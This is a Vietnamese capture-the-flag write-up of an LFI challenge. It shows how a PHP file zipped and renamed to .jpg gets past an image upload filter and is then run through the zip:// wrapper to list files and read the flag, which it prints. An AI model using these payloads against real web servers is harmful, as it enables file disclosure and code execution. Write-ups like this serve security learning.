![image](https://github.com/user-attachments/assets/3569ec69-8943-40bc-a0bc-c77d05b6d927)![image](https://github.com/user-attachments/assets/19ec07a3-e34b-4582-8222-acf9129bff07)

Ta thấy tên bài là LFI-wrappers lại chỉ cho upload img . Dạo 1 vòng thì tôi tìm thấy 1 hướng khai thác khá phù hợp 
trên HackTricks đó là tạo 1 file php => nén zip => đổi sang đuôi jpg => upload...

![image](https://github.com/user-attachments/assets/ebbf953c-08d3-412b-9652-7d0dc18a09d6)

Let's go!!!!
tạo file a.php với nội dung
```
<?php
        echo file_get_contents("index.php");
?>
```
![image](https://github.com/user-attachments/assets/acb1ee1a-6414-43d1-a229-776e6378b5ad)

sau khi upload thành công, vào page source ta thấy đường dẫn tới nơi chứa file

![image](https://github.com/user-attachments/assets/dfbb0eea-6e8d-48c9-a431-473b40192e31)

sử dụng ```page=zip://tmp/upload/8xTzPkxzi.jpg%23a```

![image](https://github.com/user-attachments/assets/3570f029-e80d-44c9-b81f-209f19c0b1b4)

Sử dụng đoạn code 
```
<?php
  $scan = scandir('./'); 
  foreach($scan as $file){
    echo "~ $file";
  }
?>

```
![image](https://github.com/user-attachments/assets/666f0d4d-5c29-42ed-a42f-1c710faabdd5)

=> flag-mipkBswUppqwXlq9ZydO.php

```
<?php
        echo file_get_contents("./flag-mipkBswUppqwXlq9ZydO.php");
?>
```

![image](https://github.com/user-attachments/assets/726da82f-e48c-4500-b909-6e6640cef163)

=))) trắng tinh nhưng đừng lo , vào page-source

![image](https://github.com/user-attachments/assets/bb2caa06-02a4-457d-bead-ce338e44e7d4)

=> lf1-Wr4pp3r_Ph4R_pwn3d
